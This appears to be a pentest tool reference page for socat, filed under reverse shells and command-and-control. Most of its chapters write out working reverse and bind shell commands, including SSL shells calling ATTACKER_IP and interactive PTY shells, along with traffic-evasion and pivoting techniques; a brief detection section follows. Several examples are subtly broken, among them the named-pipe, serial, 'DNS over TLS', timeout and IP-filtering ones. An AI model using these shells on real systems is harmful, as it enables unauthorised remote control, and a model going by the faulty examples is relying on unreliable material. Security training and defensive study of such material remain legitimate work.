---
title: "socat - Multipurpose Relay"
description: "Bidirectional data transfer tool for creating encrypted reverse shells, port forwarding, and socket manipulation"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
package: "socat"
kali_install: "sudo apt install socat"
version: "1.8.1.1"
---

# socat

## Overview

socat (SOcket CAT) is a multipurpose relay that establishes two bidirectional byte streams and transfers data between them. It supports a vast array of address types including TCP, UDP, SSL/TLS, SOCKS, serial ports, files, and pipes. socat's versatility makes it the most powerful tool for creating encrypted reverse shells, port forwarding, and complex network configurations.

Unlike netcat, socat supports SSL/TLS natively, providing encrypted connections without additional tools. It supports forking for handling multiple connections, logging, and numerous options for interprocess communication. socat can act as a TCP relay, external socksifier, shell interface to Unix sockets, and IPv6 relay.

socat is essentially a concatenation utility for bidirectional data streams. It connects two addresses and copies data between them. Each address can be a file, pipe, device (terminal or modem), or socket (Unix, IPv4, IPv6, raw, UDP, TCP, SSL). This flexibility makes it invaluable for penetration testing and network administration.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt update
sudo apt install socat
```

### From Source

```bash
# Download source
wget http://www.dest-unreach.org/socat/download/socat-1.8.1.1.tar.gz
tar xzf socat-1.8.1.1.tar.gz
cd socat-1.8.1.1

# Build
./configure
make

# Install
sudo make install
```

### Verify Installation

```bash
socat -V
```

### Companion Tools

socat ships with additional utilities:
- `filan` - Analyzes file descriptors of the process
- `procan` - Analyzes system parameters of the process

```bash
# Analyze file descriptors
filan -i 3

# Analyze process parameters
procan -c
```

## Chapter 2: Basic Usage

### Simple Listener

```bash
socat TCP-LISTEN:4444,fork STDOUT
```

**Explanation**: `TCP-LISTEN:4444` creates a TCP listener on port 4444, `fork` handles multiple connections, and `STDOUT` outputs received data to the terminal. Without `fork`, socat handles only one connection.

### Connect to Host

```bash
socat - TCP:192.168.1.100:4444
```

**Explanation**: Connects to the specified TCP endpoint. Data from stdin is sent to the remote host, and data received is displayed on stdout. The `-` indicates stdin.

### Verbose Mode

```bash
socat -d -d TCP-LISTEN:4444,fork STDOUT
```

**Explanation**: The `-d` flags increase verbosity. One `-d` shows errors, two shows information about connections, three shows data flow, four shows debug information.

### Hex Dump Mode

```bash
socat -x -x TCP-LISTEN:4444,fork STDOUT
```

**Explanation**: The `-x` flags enable hexadecimal dump of data traffic. Useful for debugging protocol issues and inspecting binary data.

## Chapter 3: Encrypted Reverse Shells

### SSL Reverse Shell

```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem

# Attacker (listener)
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 STDOUT

# Target
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash
```

**Explanation**: The attacker creates an SSL listener that accepts encrypted connections. The target connects using SSL and executes `/bin/bash`, providing an encrypted reverse shell. `verify=0` disables certificate verification for self-signed certificates.

### SSL Bind Shell

```bash
# Target
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,reuseaddr,fork EXEC:/bin/bash

# Attacker
socat OPENSSL:192.168.1.100:4444,verify=0 STDOUT
```

**Explanation**: The target listens for SSL connections and provides a shell. `reuseaddr` allows port reuse, and `fork` handles multiple simultaneous connections.

### SSL with Client Certificate

```bash
# Generate CA and client certificate
openssl req -newkey rsa:2048 -nodes -keyout ca.key -x509 -days 365 -out ca.crt
openssl req -newkey rsa:2048 -nodes -keyout client.key -out client.csr
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt

# Server
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=1,cafile=ca.crt STDOUT

# Client
socat OPENSSL:SERVER_IP:4444,cert=client.pem,cafile=ca.crt STDOUT
```

**Explanation**: Mutual TLS authentication ensures both server and client are verified. The server validates the client's certificate against the CA, providing bidirectional authentication.

### Interactive Shell with PTY

```bash
# Target
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Attacker
socat file:`tty`,raw,echo=0 OPENSSL:TARGET_IP:4444,verify=0
```

**Explanation**: Provides a fully interactive shell with PTY allocation. `pty` allocates a pseudo-terminal, `stderr` redirects stderr, `setsid` creates a new session, `sigint` allows Ctrl+C, and `sane` sets sane terminal options.

## Chapter 4: Port Forwarding

### TCP Port Forward

```bash
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

**Explanation**: Listens on port 8080 and forwards all connections to port 80 on the internal host. The `fork` option handles multiple concurrent connections.

### UDP Port Forward

```bash
socat UDP-LISTEN:53,fork UDP:192.168.1.100:53
```

**Explanation**: Forwards UDP traffic from port 53 to the specified internal host. UDP forwarding is connectionless and does not require `fork` for multiple sources.

### SSL Port Forward

```bash
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:192.168.1.100:80
```

**Explanation**: Accepts SSL connections on port 443 and forwards them to an internal HTTP server on port 80. This provides SSL termination for internal services.

### TCP4 and TCP6

```bash
# IPv4 only
socat TCP4-LISTEN:8080,fork TCP4:192.168.1.100:80

# IPv6 only
socat TCP6-LISTEN:8080,fork TCP6:[::1]:80

# Dual stack
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

**Explanation**: socat supports IPv4 and IPv6. Use TCP4/TCP6 for specific protocol versions, or TCP for automatic selection.

### Multi-Port Listening

```bash
socat TCP-LISTEN:80,fork TCP:internal:80 &
socat TCP-LISTEN:443,fork TCP:internal:443 &
socat TCP-LISTEN:22,fork TCP:internal:22 &
```

**Explanation**: Run multiple socat instances to forward different ports. Each instance handles one port.

### Local Forward with Bind Address

```bash
socat TCP-LISTEN:8080,bind=127.0.0.1,fork TCP:192.168.1.100:80
```

**Explanation**: Binds the listener to localhost only. Remote connections cannot access the forwarded port directly.

## Chapter 5: Remote Access

### Remote Shell Access

```bash
# Target
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Attacker
socat file:`tty`,raw,echo=0 TCP:192.168.1.100:4444
```

**Explanation**: The target provides a shell with PTY allocation, stderr redirection, and proper signal handling. The attacker gets a fully interactive shell with job control and signal support.

### SSH over SSL

```bash
socat OPENSSL-LISTEN:2222,cert=server.pem,verify=0,reuseaddr,fork TCP:localhost:22
```

**Explanation**: Wraps an SSH service with SSL encryption. Clients connect to port 2222 with SSL, and the traffic is forwarded to the local SSH daemon on port 22.

### Remote Shell with Environment

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"/bin/bash -li",pty,stderr,setsid,sigint,sane
```

**Explanation**: Provides an interactive login shell with PTY support. The `-li` flags enable login shell behavior, providing environment variables and startup scripts.

### Windows Shell

```bash
# Windows target
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:cmd.exe,pipes

# Attacker
socat - TCP:TARGET_IP:4444
```

**Explanation**: On Windows, `cmd.exe` provides a command shell. The `pipes` option uses Windows named pipes for I/O.

## Chapter 6: Advanced Techniques

### SOCKS Proxy

```bash
socat TCP-LISTEN:1080,fork SOCKS4A:proxy_host:target_host:443,socksuser=nobody
```

**Explanation**: Creates a SOCKS4a proxy that routes traffic through a proxy server. Applications configured to use this SOCKS proxy can reach remote hosts through the proxy chain.

### SOCKS5 Proxy

```bash
socat TCP-LISTEN:1080,fork SOCKS5-CONNECT:proxy_host:target_host:443
```

**Explanation**: Creates a SOCKS5 proxy connection. SOCKS5 supports more features than SOCKS4a, including UDP relay and authentication.

### File Transfer over SSL

```bash
# Receiver
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 FILE:received_file,create

# Sender
socat OPENSSL:SERVER_IP:4444,verify=0 FILE:file_to_send
```

**Explanation**: Transfers files through an SSL-encrypted tunnel. The `create` option creates the output file if it does not exist.

### Named Pipe Communication

```bash
# Create named pipe
mkfifo /tmp/myfifo

# Writer
socat - UNIX-CONNECT:/tmp/myfifo

# Reader
socat UNIX-LISTEN:/tmp/mypipe,fork STDOUT
```

**Explanation**: Uses Unix domain sockets for inter-process communication. Named pipes provide a simple way to communicate between processes.

### Serial Console Access

```bash
socat - UNIX-CONNECT:/dev/ttyUSB0,rawer
```

**Explanation**: Connects to a serial device with raw I/O settings. This provides direct terminal access to embedded devices, routers, and other serial-console equipment.

### PTY Communication

```bash
# Create a virtual terminal
socat - PTY,raw,echo=0
```

**Explanation**: Creates a pseudo-terminal for testing and development. Useful for simulating serial connections.

## Chapter 7: Evasion and Stealth

### Traffic Obfuscation

socat's SSL traffic appears as standard HTTPS to network monitors. Combined with standard port numbers (443), the traffic blends with legitimate web browsing.

### DNS over TLS

```bash
socat TCP-LISTEN:53,reuseaddr,fork TCP:8.8.8.8:853
```

**Explanation**: Redirects DNS queries to DNS-over-TLS, encrypting DNS traffic and preventing monitoring of DNS queries.

### Multi-Stage Pivoting

```bash
# Stage 1: External relay
socat TCP-LISTEN:4444,fork TCP:internal_host:80

# Stage 2: Internal forward
socat TCP-LISTEN:80,reuseaddr,fork TCP:127.0.0.1:8080
```

**Explanation**: Chain multiple socat instances to create multi-hop pivots through different network segments, each hop using a different relay.

### Encrypted Channel with Certificate Pinning

```bash
# Generate CA
openssl req -newkey rsa:2048 -nodes -keyout ca.key -x509 -days 365 -out ca.crt

# Generate server cert
openssl req -newkey rsa:2048 -nodes -keyout server.key -out server.csr
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt
cat server.key server.crt > server.pem

# Server
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=1,cafile=ca.crt STDOUT

# Client
socat OPENSSL:SERVER_IP:4444,verify=1,cafile=ca.crt STDIO
```

**Explanation**: Using CA-signed certificates provides stronger authentication than self-signed certificates. The client validates the server certificate against the CA.

## Chapter 8: Practical Scenarios

### Web Server with SSL Termination

```bash
socat OPENSSL-LISTEN:443,cert=web.pem,verify=0,reuseaddr,fork TCP:127.0.0.1:80
```

**Explanation**: Terminates SSL for a web server running on localhost:80. External clients connect via HTTPS on port 443, and socat decrypts the traffic before forwarding.

### Load Balancer

```bash
# Simple round-robin load balancer
socat TCP-LISTEN:80,fork TCP:backend1:80 &
socat TCP-LISTEN:80,fork TCP:backend2:80 &
```

**Explanation**: Multiple socat instances can provide basic load balancing by forwarding to different backends. For production use, consider dedicated load balancers.

### Port Knocking

```bash
# Knock sequence: 7000, 8000, 9000 opens port 22
socat TCP-LISTEN:7000,reuseaddr,fork EXEC:"socat TCP-LISTEN:8000,reuseaddr,fork EXEC:'socat TCP-LISTEN:9000,reuseaddr,fork EXEC:iptables -A INPUT -p tcp --dport 22 -j ACCEPT'"
```

**Explanation**: Port knocking uses a sequence of connection attempts to open firewall ports. Each knock triggers the next stage.

### TCP Wrapper

```bash
# Allow only specific IPs
socat TCP-LISTEN:22,fork,reuseaddr TCP:localhost:22,connect-timeout=5
```

**Explanation**: socat can implement basic connection filtering. The connect-timeout option limits connection attempts.

### Bandwidth Monitoring

```bash
socat TCP-LISTEN:8080,fork TCP:target:80 &
# Monitor traffic with tcpdump
tcpdump -i any port 8080 -w traffic.pcap
```

**Explanation**: Combine socat with monitoring tools to inspect traffic. tcpdump captures all traffic passing through the forwarded port.

## Chapter 9: Detection and Defense

### Network Signatures

- SSL/TLS connections on non-standard ports
- Unusual connection patterns (many short-lived connections)
- High data transfer on ports typically used for control

### IDS/IPS Detection

```
# Snort rule for socat SSL shells
alert tcp any any -> any any (msg:"SSL on Non-Standard Port"; \
  flow:to_server,established; \
  content:"|16 03|"; \
  threshold:type both,track by_src, count 5, seconds 60; \
  sid:1000001; rev:1;)
```

### Log Analysis

```bash
# Monitor for unusual SSL connections
ss -tnp | grep -E "ESTAB.*:[0-9]{4,5}"

# Check for socat processes
ps aux | grep socat
```

### Defense Recommendations

1. Monitor for SSL connections on non-standard ports
2. Implement application-layer firewalls
3. Use certificate pinning for legitimate SSL services
4. Monitor for unusual data transfer patterns
5. Implement network segmentation

## Chapter 10: Troubleshooting

### Connection Refused

```bash
# Check if port is in use
ss -tlnp | grep 4444

# Check firewall rules
iptables -L -n

# Test with netcat
nc -zv TARGET_IP 4444
```

### SSL Certificate Issues

```bash
# Verify certificate
openssl x509 -in cert.pem -text -noout

# Test SSL connection
openssl s_client -connect TARGET_IP:4444

# Regenerate certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 30 -out cert.pem
```

### Shell Not Interactive

```bash
# Use PTY for interactive shell
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# On attacker
socat file:`tty`,raw,echo=0 TCP:TARGET_IP:4444
```

### Permission Denied

```bash
# Check file permissions
ls -la /dev/ttyUSB0

# Run with appropriate privileges
sudo socat - UNIX-CONNECT:/dev/ttyUSB0,rawer
```

### Timeout Issues

```bash
# Increase timeout
socat TCP-LISTEN:4444,reuseaddr,fork,tcp-timeout=60 TCP:target:22

# Disable timeout
socat TCP-LISTEN:4444,reuseaddr,fork,nopersist TCP:target:22
```

## Resources

- [socat Homepage](http://www.dest-unreach.org/socat/)
- [socat man page](http://www.dest-unreach.org/socat/socat.html)
- [Kali Linux socat Page](https://www.kali.org/tools/socat/)
- [socat Examples](http://www.dest-unreach.org/socat/doc/socat.html)
- [OpenSSL Documentation](https://www.openssl.org/docs/)
